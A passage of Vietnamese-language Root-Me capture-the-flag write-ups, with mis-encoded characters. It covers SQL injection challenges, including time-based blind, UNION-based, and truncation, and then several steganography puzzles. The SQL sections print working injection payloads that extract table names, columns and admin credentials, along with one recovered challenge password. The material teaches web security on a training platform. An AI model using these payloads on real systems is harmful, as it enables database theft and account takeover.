<p>Tr∆∞·ªõc ti√™n, ta c·∫ßn t√¨m ki·∫øm ƒë·ªô d√†i c·ªßa table:</p>
<p>Payload: <em><strong>3;select+case+when+((select+length(table_name)+from+information_schema.tables+limit+1)=[length])+then+pg_sleep(10)+else+pg_sleep(-1)+end‚Äî</strong></em></p>
<p>ƒê∆∞a v√†o Intruder v√† bruteforce:</p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image3.png" alt="" /></p>
<p>·ªû b·∫£ng k·∫øt qu·∫£, ta filter l·∫°i c·ªôt ‚ÄúResponse Complete‚Äù. Res n√†o c√≥ ƒë·ªô l·ªõn cao nh·∫•t th√¨ ch·∫Øc h·∫≥n ƒë√≥ l√† payload ƒë√∫ng.</p>
<ul>
<li>length(table_name) == 5</li>
</ul>
<p>ƒê√£ c√≥ table_name, ta ti·∫øn h√†nh bruteforce table_name. B·ªè v√†o intruder:</p>
<p><em>member=3;select+case+when+(substr((select+table_name+from+information_schema.tables+limit+1),<strong>¬ß1¬ß</strong>,1)=chr(<strong>¬ß¬ß</strong>))+then+pg_sleep(10)+else+pg_sleep(-1)+end--</em></p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image4.png" alt="" /></p>
<p>Gh√©p l·∫°i ta ƒë∆∞·ª£c <strong>table_name=users</strong></p>
<ol>
<li><strong>T√¨m column_name</strong></li>
</ol>
<p>T∆∞∆°ng t·ª± nh∆∞ table_name, ta t√¨m length(column_name) c·ªßa c·ªôt ƒë·∫ßu ti√™n:</p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image5.png" alt="" /></p>
<p>K·∫øt qu·∫£ tr·∫£ v·ªÅ payload length(column_name) = 2. Ta c√≥ th·ªÉ d·ª± ƒëo√°n n√≥ c√≥ th·ªÉ l√† ‚Äòid‚Äô. Ki·ªÉm ch·ª©ng b·∫±ng Repeater:</p>
<ul>
<li>K√Ω t·ª± ‚Äòi‚Äô:</li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image6.png" alt="" /></p>
<ul>
<li>K√Ω t·ª± ‚Äòd‚Äô:</li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image7.png" alt="" /></p>
<ul>
<li>C·∫£ 2 response ƒë·ªÅu t·ªën 2,285 miliseconds (t∆∞∆°ng t·ª± th·ªùi gian fuzz, kh√°c v·ªõi response th√¥ng th∆∞·ªùng ~ 200 ‚Äì 300 milisecond) column[0] == id</li>
</ul>
<p>ƒê·ªÉ t√¨m ƒë∆∞·ª£c column ti·∫øp theo, ta s·ª≠ d·ª•ng offset ƒë·ªÉ filter l·∫°i v√† th·ª±c hi·ªán t∆∞∆°ng t·ª±, bruteforce th√¥i:</p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image8.png" alt="" /></p>
<ul>
<li>length(column[2]) == 8</li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image9.png" alt="" /></p>
<ul>
<li>column_name[1] = username</li>
</ul>
<p>Column[2], c√≥ length == 9:</p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image10.png" alt="" /></p>
<p>Bruteforce ƒë∆∞·ª£c k·∫øt qu·∫£ column_name[2] == firstname:</p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image11.png" alt="" /></p>
<p>T∆∞∆°ng t·ª±, column[3] c√≥ length == 8, v√† d·ªÖ d√†ng ƒëo√°n ƒë∆∞·ª£c:</p>
<ul>
<li>column_name[3] == lastname:</li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image12.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image13.png" alt="" /></p>
<p>Column[4] c√≥ length == 5. Suy ƒëo√°n v√† th·ª≠ ƒë∆∞·ª£c k·∫øt qu·∫£:</p>
<ul>
<li>column_name[4] == email</li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image14.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image15.png" alt="" /></p>
<p>column[5] c√≥ ƒë·ªô d√†i k√Ω t·ª± l√† length == 8:</p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image16.png" alt="" /></p>
<p>V√¨ length ==8, ta th·ª≠ ki·ªÉm ch·ª©ng keyword = ‚Äòpassword‚Äô th√¨ th·∫•y tr√πng kh·ªõp:</p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image17.png" alt="" /></p>
<p>Nh∆∞ v·∫≠y, ta ƒë√£ t√¨m ƒë∆∞·ª£c ƒë√∫ng c·ªôt password, gi·ªù th√¨ t√¨m password c·ªßa admin. Admin c√≥ id=1, ta ch·ªâ c·∫ßn t√¨m ki·∫øm v·ªõi offset = 0 l√† s·∫Ω ra.</p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image18.png" alt="" /></p>
<ul>
<li><strong>length(password) == 13</strong></li>
</ul>
<p>Sau h∆°n 1 ng√†y bruteforce v·ªõi payload, ta ƒë∆∞·ª£c k·∫øt qu·∫£:</p>
<p><em>member=3;select+case+when+(substr((select+password+from+users+limit+1+offset+0),<strong>¬ß¬ß</strong>,1)=chr(<strong>¬ß¬ß</strong>))+then+pg_sleep(10)+else+pg_sleep(-1)+end--</em></p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image19.png" alt="" /></p>
<p>Ta c√≥ ƒë∆∞·ª£c chu·ªói ascii password: <strong>84 33 109 51 66 64 115 51 68 83 81 76 33</strong></p>
<p>Convert to text: <strong>T!m3B@s3DSQL!</strong></p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image20.png" alt="" /></p>
<p><strong>Flag:</strong> T!m3B@s3DSQL!</p>
<p>- Flag:</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---numeric"><a class="header" href="#sql-injection---numeric"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric">SQL injection - Numeric</a></a></h1>
<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image1.png" alt="" /></p>
<p>Th·ª≠ bypass qua login th√¨ kh√¥ng th·ªÉ th·ª±c hi·ªán ƒë∆∞·ª£c.</p>
<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image2.png" alt="" /></p>
<p>Ki·ªÉm tra c√°c th·∫ª kh√°c trong Home v√¨ nh·∫≠n th·∫•y ƒëi·ªÅu ƒë·∫∑c bi·ªát r·∫±ng, 3 link n√†y ƒë·ªÅu d·∫´n ƒë·∫øn <strong>action=news&amp;news_id=[x].</strong> Th·ª≠ x√≥a id c·ªßa news th√¨ ph√°t hi·ªán database b·ªã l·ªói:</p>
<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image3.png" alt="" /></p>
<p>Database c·ªßa server l√† SQLite3. T∆∞∆°ng t·ª± b√†i SQL Injection ‚Äì String, ta th·ª±c hi·ªán inject n√≥ ƒë·ªÉ t√¨m ra admin. Ta d√≤ ƒë∆∞·ª£c s·ªë c·ªôt l√† 3:</p>
<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image4.png" alt="" /></p>
<p>Payload: <a href="http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1%20union%20select%201,1,1%20from%20sqlite_master">challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1 union select 1,1,1 from sqlite_master</a></p>
<p>Ta d√≤ ƒë∆∞·ª£c c√≥ 2 b·∫£ng users v√† news:</p>
<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image5.png" alt="" /></p>
<p>Payload: <a href="http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1%20union%20select%201,1,name%20from%20sqlite_master">challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1 union select 1,1,name from sqlite_master</a></p>
<p>T∆∞∆°ng t·ª± b√†i String, ta show ra ƒë∆∞·ª£c username v√† password c·ªßa users:</p>
<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image6.png" alt="" /></p>
<p>Payload: <a href="http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1%20union%20select%201,username,password%20from%20users">challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1 union select 1,username,password from users</a></p>
<p>Login v√†o th√†nh c√¥ng:</p>
<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image7.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---string"><a class="header" href="#sql-injection---string"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String">SQL injection - String</a></a></h1>
<p><img src="SQL-Injection/SQLinjectionstring/./media/image1.png" alt="" /></p>
<p>Th·ª≠ SQLi ·ªü th·∫ª Login th√¨ kh√¥ng bypass ƒë∆∞·ª£c, ta qua th·∫ª Search ƒë·ªÉ th·ª≠. ·ªû th·∫ª n√†y c√≥ v·∫ª kh·∫£ thi h∆°n v√¨ n√≥ c√≥ th·ª±c hi·ªán query theo input c·ªßa ta. V√≠ d·ª•:</p>
<p><img src="SQL-Injection/SQLinjectionstring/./media/image2.png" alt="" /></p>
<p>ƒê·∫ßu ti√™n, th·ª≠ v·ªõi payload ƒë∆°n gi·∫£n <strong>1‚Äô or 1=1--</strong> , th√¨ ph√°t hi·ªán n√≥ ƒë√£ b·ªã SQLi th√†nh c√¥ng:</p>
<p><img src="SQL-Injection/SQLinjectionstring/./media/image3.png" alt="" /></p>
<p>Ta th·ª±c hi·ªán blind SQL ƒë·ªÉ t√¨m ki·∫øm th√¥ng tin infor c·ªßa admin ƒë·ªÉ c√≥ th·ªÉ login. Ta th·ª≠ v·ªõi payload <strong>1‚Äô union select 1</strong> , th√¨ nh·∫≠n v·ªÅ l·ªói sau:</p>
<p><img src="SQL-Injection/SQLinjectionstring/./media/image4.png" alt="" /></p>
<p>C√≥ th·ªÉ bi·∫øt ƒë∆∞·ª£c server s·ª≠ d·ª•ng SQLite3, t·ª´ ƒë√≥, c√¥ng vi·ªác c·ªßa ta c·∫ßn s·ª≠ d·ª•ng c√∫ ph√°p c·ªßa SQLite3 ƒë·ªÉ m√≤ ra c√°c table trong database v·ªõi hi v·ªçng t√¨m ƒë∆∞·ª£c admin. Nh∆∞ng tr∆∞·ªõc ti√™n, ta c·∫ßn ph·∫£i th·ª±c hi·ªán d√≤ s·ªë c·ªôt. Thay payload th√†nh <strong>1‚Äô union select 1,1--</strong> th√¨ c√≥ v·∫ª ƒë√£ t√¨m ƒë∆∞·ª£c s·ªë c·ªôt l√† 2:</p>
<p><img src="SQL-Injection/SQLinjectionstring/./media/image5.png" alt="" /></p>
<p>V√¨ server d√πng SQLite3, do v·∫≠y, ta c·∫ßn truy v·∫´n c√°c table b·∫±ng c√°ch t√¨m trong <strong>sqlite_master</strong> ho·∫∑c <strong>sqlite_schema.</strong> Th·ª≠ truy v·∫•n v·ªõi payload <strong>1‚Äô union select 1,name from sqlite_master--</strong> ta c√≥:</p>
<p><img src="SQL-Injection/SQLinjectionstring/./media/image6.png" alt="" /></p>
<p>Ti·∫øp t·ª•c, ta blind v√†o table users <em>1' union select 1,1 from users--</em></p>
<p><img src="SQL-Injection/SQLinjectionstring/./media/image7.png" alt="" /></p>
<p>Ti·∫øp t·ª•c, ta th·ª≠ query t√¨m username v√† password v·ªõi payload <strong>1' union select username,password from users-- :</strong></p>
<p><img src="SQL-Injection/SQLinjectionstring/./media/image8.png" alt="" /></p>
<p>Th·ª≠ login th√¨ th√†nh c√¥ng:</p>
<p><img src="SQL-Injection/SQLinjectionstring/./media/image9.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-truncation"><a class="header" href="#sql-truncation"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-Truncation">SQL Truncation</a>**</a></h1>
<p><img src="SQL-Injection/SQLTruncation/./media/image1.png" alt="" /></p>
<p><strong>SQL Truncation</strong> l√† l·ªó h·ªïng x·∫£y ra khi user input v∆∞·ª£t qua c√°c ƒëi·ªÅu ki·ªán c·ªßa database khi·∫øn database xung ƒë·ªôt v√† g√¢y ra hi·ªán t∆∞·ª£ng thi·∫øu x√°c th·ª±c.</p>
<p>·ªû challenge n√†y, ta ph·∫£i m·∫°o danh admin v√† login v√†o tab c·ªßa admin. ƒê·∫ßu ti√™n, ta ki·∫øm tra sources code v√† th·∫•y ƒë∆∞·ª£c comment v·ªÅ c√°c query khi register:</p>
<p><img src="SQL-Injection/SQLTruncation/./media/image2.png" alt="" /></p>
<p>·ªû username v√† password, ta c√≥ th·ªÉ th·∫•y, database gi·ªõi h·∫°ng length = 12 (login) v√† length = 32 (password). Nh∆∞ v·∫≠y, ta th·ª≠ attack v√†o username v·ªõi payload:</p>
<ul>
<li>
<p><strong>Username:</strong> admin hehehehe (7 whitespace)</p>
</li>
<li>
<p><strong>Password:</strong> somethinghere</p>
</li>
</ul>
<p><img src="SQL-Injection/SQLTruncation/./media/image3.png" alt="" /></p>
<p>Khi n√†y, ta nh·∫≠n ƒë∆∞·ª£c th√¥ng b√°o ‚ÄúUser saved‚Äù. Theo SQL Truncations, l√∫c n√†y, th√¥ng tin login c·ªßa ta s·∫Ω b·ªã truncate th√†nh:</p>
<ul>
<li>
<p><strong>Username</strong>: admin</p>
</li>
<li>
<p><strong>Password (new)</strong>: somethinghere</p>
</li>
</ul>
<p>Ta chuy·ªÉn qua tab Administrator, login v√†o b·∫±ng password v·ª´a t·∫°o:</p>
<p><img src="SQL-Injection/SQLTruncation/./media/image4.png" alt="" /></p>
<p>Ta nh·∫≠n ƒë∆∞·ª£c flag sau khi login!</p>
<ul>
<li>Flag: *********************</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="steganography"><a class="header" href="#steganography">Steganography</a></h1>
<p>Root-me link for this subject: <a href="https://www.root-me.org/en/Challenges/Steganography/">https://www.root-me.org/en/Challenges/Steganography/</a></p>
<ul>
<li><a href="Steganography/index.html#steganography">Steganography</a>:
<ul>
<li><a href="Steganography/index.html#exif---metadata">EXIF - Metadata</a></li>
<li><a href="Steganography/index.html#dot-and-next-line">Dot and next line</a></li>
<li><a href="Steganography/index.html#steganomobile">Steganomobile</a></li>
<li><a href="Steganography/index.html#twitter-secret-messages">Twitter Secret Messages</a></li>
<li><a href="Steganography/index.html#poem-from-space">Poem from Space</a></li>
<li><a href="Steganography/index.html#yellow-dots">Yellow dots</a></li>
<li><a href="Steganography/index.html#wav---noise-analysis">WAV - Noise analysis</a></li>
<li><a href="Steganography/index.html#exif---thumbnail">EXIF - Thumbnail</a></li>
<li><a href="Steganography/index.html#wav-spectral-analysis">WAV-Spectral-analysis</a></li>
<li><a href="Steganography/index.html#apng--just-a-png">APNG ‚Äì Just a PNG</a></li>
<li><a href="Steganography/index.html#txt---george-and-alfred">TXT - George and Alfred</a></li>
<li><a href="Steganography/index.html#embedded-pdf">Embedded PDF</a></li>
<li><a href="Steganography/index.html#kitty-spy">Kitty spy</a></li>
<li><a href="Steganography/index.html#crypto-art">Crypto Art</a></li>
<li><a href="Steganography/index.html#png---pixel-indicator-technique">PNG - Pixel Indicator Technique</a></li>
<li><a href="Steganography/index.html#png---pixel-value-differencing">PNG - Pixel Value Differencing</a></li>
</ul>
</li>
</ul>
<hr />
<h2 id="exif---metadata"><a class="header" href="#exif---metadata">EXIF - Metadata</a></h2>
<p>Link challenges: <a href="https://www.root-me.org/en/Challenges/Steganography/EXIF-Metadata">https://www.root-me.org/en/Challenges/Steganography/EXIF-Metadata</a></p>
<p>S·ª≠ d·ª•ng tool ƒë·ªÉ xem exifdata: <a href="https://www.metadata2go.com/">https://www.metadata2go.com/</a></p>
<p>Ta t√¨m ƒë∆∞·ª£c GPS location: <strong>43 deg 17' 56.27" N, 5 deg 22' 49.38" E</strong></p>
<p><img src="Steganography/./media/image1.png" alt="" /></p>
<p>S·ª≠ d·ª•ng Google Maps ƒë·ªÉ ƒë·ªãnh v·ªã location ta t√¨m ƒë∆∞·ª£c ƒë·ªãa ch·ªâ t·∫°i: <strong>2 Pl. des Capucines, 13001 Marseille, France:</strong></p>
<p><img src="Steganography/./media/image2.png" alt="" /></p>
<p>Flag l√† th√†nh ph·ªë n∆°i ch·ª•p b·ª©c ·∫£nh.</p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image3.png" alt="" /></p>
<hr />
<h2 id="dot-and-next-line"><a class="header" href="#dot-and-next-line">Dot and next line</a></h2>
<p>H√¨nh ·∫£nh ƒë∆∞·ª£c cho:</p>
<img src="Steganography/./media/image4.jpeg" style="width:5.58276in;height:4.35606in" alt="Text, letter Description automatically generated" />
<p>Ch√∫ √Ω v√†o title c·ªßa challenge, ta c√≥ ‚Äòdot‚Äô v√† ‚Äònext line‚Äô l√† hai keyword. Ch√∫ √Ω v√†o h√¨nh ·∫£nh ƒë∆∞·ª£c cho, ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± s·∫Øp x·∫øp ng·∫´u nhi√™n v√† kh√¥ng c√≥ quy t·∫Øc c·ªßa c√°c d·∫•u ch·∫•m v√† c·∫£ xu·ªëng d√≤ng.</p>
<p>T·ª´ t√™n c·ªßa challenge, ta ƒë·∫∑t ra 2 gi·∫£ thuy·∫øt:</p>
<p>- Gh√©p c√°c k√Ω t·ª± b√™n d∆∞·ªõi d·∫•u ch·∫•m l·∫°i v·ªõi nhau (dot and next line)</p>
<p>- V√† ng∆∞·ª£c l·∫°i (line and next dot)</p>
<p>T·ª´ ƒë√≥, ta c√≥ 2 k·∫øt qu·∫£:</p>
<p>- urpa de (kh√¥ng c√≥ nghƒ©a v√† d∆∞ th·ª´a kho·∫£ng tr·∫Øng)</p>
<p>- chatelet15h</p>
<p>Submit v√† th√†nh c√¥ng</p>
<p><strong>Flag</strong>: *******</p>
<p><img src="Steganography/./media/image5.png" alt="" /></p>
<hr />
<h2 id="steganomobile"><a class="header" href="#steganomobile">Steganomobile</a></h2>
<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Steganomobile">https://www.root-me.org/en/Challenges/Steganography/Steganomobile</a></p>
<p><img src="Steganography/./media/image6.png" alt="" /></p>
<p>S·ª≠ d·ª•ng c√¥ng c·ª• <a href="https://dcode.fr">https://dcode.fr</a> ƒë·ªÉ decode n√≥ d∆∞·ªõi d·∫°ng Multi-Tap Phone ta ƒë∆∞·ª£c k·∫øt qu·∫£ l√† CELLPHONE.</p>
<p><img src="Steganography/./media/image7.png" alt="" /></p>
<p>Th·ª≠ nh·∫≠p k·∫øt qu·∫£ nh∆∞ng sai. Chuy·ªÉn sang lowercase th√¨ submit th√†nh c√¥ng!</p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image8.png" alt="" /></p>
<hr />
<h2 id="twitter-secret-messages"><a class="header" href="#twitter-secret-messages">Twitter Secret Messages</a></h2>
<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Twitter-Secret-Messages">https://www.root-me.org/en/Challenges/Steganography/Twitter-Secret-Messages</a></p>
<p>S·ª≠ d·ª•ng c√¥ng c·ª• Twtitter Secret Message: <a href="https://holloway.nz/steg/">https://holloway.nz/steg/</a></p>
<p><img src="Steganography/./media/image9.png" alt="" /></p>
<p>Ta nh·∫≠n ƒë∆∞·ª£c message: <strong>rendezvous at grand central terminal on friday.</strong></p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image10.png" alt="" /></p>
<hr />
<h2 id="poem-from-space"><a class="header" href="#poem-from-space">Poem from Space</a></h2>
<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Poem-from-Space">https://www.root-me.org/en/Challenges/Steganography/Poem-from-Space</a></p>
<p><img src="Steganography/./media/image11.png" alt="" /></p>
<p>B√¥i ƒëen file, ta th·∫•y ƒë∆∞·ª£c file c√≥ l·ªìng th√™m nh·ªØng kho·∫£ng tr·∫Øng (whitespace):</p>
<p><img src="Steganography/./media/image12.png" alt="" /></p>
<p>ƒê√¢y c√≥ th·ªÉ l√† Whitespace Language. Ta remove c√°c k√Ω t·ª± latin ƒë·∫±ng tr∆∞·ªõc ƒëi v√† ƒë·ªÉ l·∫°i c√°c kho·∫£ng tr·∫Øng d∆∞ th·ª´a.</p>
<p>S·ª≠ d·ª•ng c√¥ng c·ª• Whitespace Language decode ƒë·ªÉ decode:</p>
<p><img src="Steganography/./media/image13.png" alt="" /></p>
<p><strong>Flag:</strong> RootMe{*******}</p>
<p><img src="Steganography/./media/image14.png" alt="" /></p>
<hr />
<h2 id="yellow-dots"><a class="header" href="#yellow-dots">Yellow dots</a></h2>
<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Yellow-dots">https://www.root-me.org/en/Challenges/Steganography/Yellow-dots</a></p>
<p><img src="Steganography/./media/image15.png" alt="" /></p>
<p>T√™n b√†i l√† Yellow dots, ta c√≥ th·ªÉ li√™n t∆∞·ªüng ƒë·∫øn printer. S·ª≠ d·ª•ng stegsolve ƒë·ªÉ t√¨m ra ƒëi·ªÉm kh√°c bi·ªát trong file ·∫£nh:</p>
<p><img src="Steganography/./media/image16.png" alt="" /></p>
<p>H√¨nh ·∫£nh kh√°c bi·ªát hi·ªán ra, ta c√≥ th·ªÉ d√≤ n√≥ theo printer serial:</p>
<p><img src="Steganography/./media/image17.png" alt="" /></p>
<p>Ta c√≥ b·∫£ng d√≤ nh∆∞ sau:</p>
<p><img src="Steganography/./media/image18.png" alt="" /></p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image19.png" alt="" /></p>
<hr />
<h2 id="wav---noise-analysis"><a class="header" href="#wav---noise-analysis">WAV - Noise analysis</a></h2>
<p>Link:<a href="https://www.root-me.org/en/Challenges/Steganography/WAV-Noise-analysis">https://www.root-me.org/en/Challenges/Steganography/WAV-Noise-analysis</a></p>
<p>ƒê·ªÅ b√†i l√† m·ªôt file ch3.wav. M·ªü l√™n nghe th√¨ r·∫•t kh√≥ ch·ªãu. Ph√¢n t√≠ch metadata th√¨ kh√¥ng thu th·∫≠p ƒë∆∞·ª£c b·∫•t c·ª© g√¨.</p>
<p>S·ª≠ d·ª•ng c√¥ng c·ª• Audicity ƒë·ªÉ modify √¢m thanh. Sau nhi·ªÅu l·∫ßn th·ª≠ th√¨ c√¥ng th·ª©c cho ra ƒë∆∞·ª£c m·ªôt ƒëo·∫°n voice ti·∫øng anh l√†: Speed Low (gi·∫£m c√≤n 30%) + Reverse (ƒë·∫£o ng∆∞·ª£c ƒëo·∫°n √¢m thanh):</p>
<p><img src="Steganography/./media/image20.png" alt="" /></p>
<p>Nghe l·∫°i ta c√≥ ƒë∆∞·ª£c flag: <strong>3b27641fc5h0</strong></p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image21.png" alt="" /></p>
<hr />
<h2 id="exif---thumbnail"><a class="header" href="#exif---thumbnail">EXIF - Thumbnail</a></h2>
<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/EXIF-Thumbnail">https://www.root-me.org/en/Challenges/Steganography/EXIF-Thumbnail</a></p>
<p>Strings th·ª≠ file th√¨ th·∫•y m·∫•y kh√¥ng t√¨m ƒë∆∞·ª£c g√¨ ƒë·∫∑c bi·ªát, k·ªÉ c·∫£ exiftool:</p>
<p><img src="Steganography/./media/image22.png" alt="" /></p>
<p>S·ª≠ d·ª•ng c√¥ng c·ª• b√≥c t√°ch thumbnail, <a href="https://29a.ch/photo-forensics/#thumbnail-analysis">https://29a.ch/photo-forensics/#thumbnail-analysis</a>, ta ƒë∆∞·ª£c flag:</p>
<p><img src="Steganography/./media/image23.png" alt="" /></p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image24.png" alt="" /></p>
<hr />
<h2 id="wav-spectral-analysis"><a class="header" href="#wav-spectral-analysis">WAV-Spectral-analysis</a></h2>
<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/WAV-Spectral-analysis">https://www.root-me.org/en/Challenges/Steganography/WAV-Spectral-analysis</a></p>
<p>S·ª≠ d·ª•ng Audicity tool v√† ch·ªçn ch·∫ø ƒë·ªô Spectogram ƒë·ªÉ xem. Ta c√≥ th·ªÉ xem ƒë∆∞·ª£c s√≥ng v√† n√≥ h√¨nh th√†nh ƒëo·∫°n text:</p>
<p><img src="Steganography/./media/image25.png" alt="" /></p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image26.png" alt="" /></p>
<hr />
<h2 id="apng--just-a-png"><a class="header" href="#apng--just-a-png">APNG ‚Äì Just a PNG</a></h2>
<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/APNG-Just-A-PNG">https://www.root-me.org/en/Challenges/Steganography/APNG-Just-A-PNG</a></p>
<p>Exiftool ki·ªÉm tra file:</p>
<p><img src="Steganography/./media/image27.png" alt="" /></p>
<p>S·ª≠ d·ª•ng c√¥ng c·ª• APNG Disassembler 2.9 ƒë·ªÉ extract .apng ra nhi·ªÅu frame:</p>
<p><img src="Steganography/./media/image28.png" alt="" /></p>
<p>Ki·ªÉm tra th∆∞ m·ª•c xu·∫•t ra th√¨ c√≥ c√°c file text l√† frame data. M·ªü c√°c file ƒë·∫ßu l√™n th√¨ th·∫•y c√°c th√¥ng s·ªë frame c√≥ v·∫ª nh∆∞ ƒë√£ b·ªã ASCII h√≥a. Th·ª≠ d·ªãch ng∆∞·ª£c l·∫°i 4 file ƒë·∫ßu th√¨ ra ch·ªØ FLAG (70 76 65 71):</p>
<p><img src="Steganography/./media/image29.png" alt="" /></p>
<p>S·ª≠ d·ª•ng python ƒë·ªÉ decode v√† ta ƒë∆∞·ª£c flag:</p>
<p><img src="Steganography/./media/image30.png" alt="" /></p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image31.png" alt="" /></p>
<hr />
<h2 id="txt---george-and-alfred"><a class="header" href="#txt---george-and-alfred">TXT - George and Alfred</a></h2>
<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/TXT-George-and-Alfred">https://www.root-me.org/en/Challenges/Steganography/TXT-George-and-Alfred</a></p>
<p>M·ªü challenge, ta t√¨m ƒë∆∞·ª£c ƒëo·∫°n text l√† b√†i th∆°:</p>
<p><img src="Steganography/./media/image32.png" alt="" /></p>
<p>·ªû cu·ªëi b√†i, ng∆∞·ªùi ta c√≥ ƒë·ªÉ m·ªôt c√°i hint:</p>
<p><img src="Steganography/./media/image33.png" alt="" /></p>
<p>M·ªü b√†i g·ªëc, ta bi·∫øt ƒë∆∞·ª£c, nh·ªØng t·ª´ ƒë·∫ßu h√†ng ·ªü ƒëo·∫°n cu·ªëi l√† l·ªùi m√† Musset g·ª≠i ƒë·∫øn Georges. B·∫£n c·ªßa challenge ƒë√£ thay d√≤ng <strong>‚ÄúLa r√©ponse de Georges Sand :‚Äù</strong> √† <strong>‚ÄúDe la m√™me mani√®re George Sand a r√©pondu ceci :‚Äù.</strong> D·ª±a v√†o hint, ·ªü tr√™n, ta c√≥ th·ªÉ ƒëo√°n ƒë∆∞·ª£c ‚Äúphrase cach√©e‚Äù l√† <strong>Cette Nuit</strong>. Th·ª≠ flag th√¨ th·∫•y passed!</p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image34.png" alt="" /></p>
<hr />
<h2 id="embedded-pdf"><a class="header" href="#embedded-pdf">Embedded PDF</a></h2>
<p>S·ª≠ d·ª•ng <strong>pdf-parser</strong> ƒë·ªÉ xem c·∫•u tr√∫c c·ªßa file pdf:</p>
<p><strong>pdf-parser -w epreuve_BAC_2004.pdf</strong></p>
<p><img src="Steganography/./media/image35.png" alt="" /></p>
<p>Ta th·∫•y, file <strong>Hidden_b33rs.txt</strong> ƒë∆∞·ª£c embedded trong pdf. Do v·∫≠y, s·ª≠ d·ª•ng <strong>peepdf</strong> ƒë·ªÉ xem c·∫•u tr√∫c c·ªßa stream th√¨ th·∫•y Filespec n·∫±m ·ªü object 78, t·ª´ ƒë√≥, ta s·∫Ω extract object 78 ra file:</p>
<p><img src="Steganography/./media/image36.png" alt="" /></p>
<p>Extract obect 78 ra hiddenpdf.txt:</p>
<p><img src="Steganography/./media/image37.png" alt="" /></p>
<p>File hiddenpdf.txt:</p>
<p><img src="Steganography/./media/image38.png" alt="" /></p>
<p>Data ƒë√£ b·ªã encode base64, decode n√≥ v√† xem header th√¨ ph√°t hi·ªán ƒë√¢y l√† file JFIF:</p>
<p><img src="Steganography/./media/image39.png" alt="" /></p>
<p>Xu·∫•t ra file hidden.jpg, ta c√≥ flag:</p>
<p><img src="Steganography/./media/image40.png" alt="" /></p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image41.png" alt="" /></p>
<hr />
<h2 id="kitty-spy"><a class="header" href="#kitty-spy">Kitty spy</a></h2>
<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Kitty-spy">https://www.root-me.org/en/Challenges/Steganography/Kitty-spy</a></p>
<p>Binwalk file ch16.jpg ta th·∫•y ƒë∆∞·ª£c c√°c file zip l·ªìng trong file img:</p>
<p><img src="Steganography/./media/image42.png" alt="" /></p>
<p>Extract c√°c file zip ra:</p>
<p><img src="Steganography/./media/image43.png" alt="" /></p>
<p><img src="Steganography/./media/image44.png" alt="" /></p>
<p>Trong step 1, ta c√≥:</p>
<p><img src="Steganography/./media/image45.png" alt="" /></p>
<p>S·ª≠ d·ª•ng stegsolve ƒë·ªÉ xem ·∫£nh d∆∞·ªõi nhi·ªÅu d·∫°ng:</p>
<p><img src="Steganography/./media/image46.png" alt="" /></p>
<p>Ta ƒë∆∞·ª£c flag ·ªü step1: <strong>*******</strong> (hihi encrypted flag)</p>
